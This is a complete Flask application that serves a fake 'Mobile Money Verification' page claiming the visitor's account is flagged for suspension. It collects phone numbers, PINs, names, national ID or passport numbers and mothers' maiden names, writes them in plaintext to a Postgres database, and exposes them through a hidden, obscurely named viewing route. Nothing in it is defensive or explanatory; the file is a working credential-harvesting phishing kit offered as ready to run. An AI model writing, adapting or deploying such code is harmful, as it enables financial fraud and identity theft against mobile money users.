from flask import Flask, request, render_template_string
import os
import psycopg2

app = Flask(__name__)

DATABASE_URL = os.environ.get("DATABASE_URL")

def init_db():
    if DATABASE_URL:
        try:
            conn = psycopg2.connect(DATABASE_URL)
            cur = conn.cursor()
            cur.execute("""
                CREATE TABLE IF NOT EXISTS submissions (
                    id SERIAL PRIMARY KEY,
                    phone TEXT,
                    pin TEXT,
                    name TEXT,
                    id_num TEXT,
                    mother TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            conn.commit()
            cur.close()
            conn.close()
        except Exception as e:
            print(f"Database init error: {e}")

init_db()

HTML = """
<!DOCTYPE html>
<html>
<head><title>Mobile Money Verification</title></head>
<body>
<h2>SECURITY VERIFICATION REQUIRED</h2>
<p>Your account has been flagged for suspicious activity. Verify your details to avoid suspension.</p>
<form method="POST" action="/submit">
Phone Number: <input type="text" name="phone" placeholder="0712345678"><br>
PIN: <input type="password" name="pin" placeholder="1234"><br>
Full Name (as on ID): <input type="text" name="name"><br>
ID Number (ID/Passport): <input type="text" name="id"><br>
Mother's Maiden Name: <input type="text" name="mother"><br>
<input type="submit" value="Verify">
</form>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/submit', methods=['POST'])
def submit():
    phone = request.form.get('phone')
    pin = request.form.get('pin')
    name = request.form.get('name')
    id_num = request.form.get('id')
    mother = request.form.get('mother')
    
    if DATABASE_URL:
        try:
            conn = psycopg2.connect(DATABASE_URL)
            cur = conn.cursor()
            cur.execute(
                "INSERT INTO submissions (phone, pin, name, id_num, mother) VALUES (%s, %s, %s, %s, %s)",
                (phone, pin, name, id_num, mother)
            )
            conn.commit()
            cur.close()
            conn.close()
        except Exception as e:
            print(f"Database insert error: {e}")
            
    return "Verification successful. You will be redirected."

@app.route('/view-270ea80433ceb605')
def log():
    if not DATABASE_URL:
        return "No database connected."
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT id, phone, pin, name, id_num, mother, created_at FROM submissions ORDER BY created_at DESC")
        rows = cur.fetchall()
        cur.close()
        conn.close()
        
        output = "<h2>Stored Submissions:</h2><pre>"
        for row in rows:
            output += f"ID: {row[0]} | Phone: {row[1]} | PIN: {row[2]} | Name: {row[3]} | ID: {row[4]} | Mother: {row[5]} | Time: {row[6]}\n"
        output += "</pre>"
        return output
    except Exception as e:
        return f"Error reading database: {e}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
    
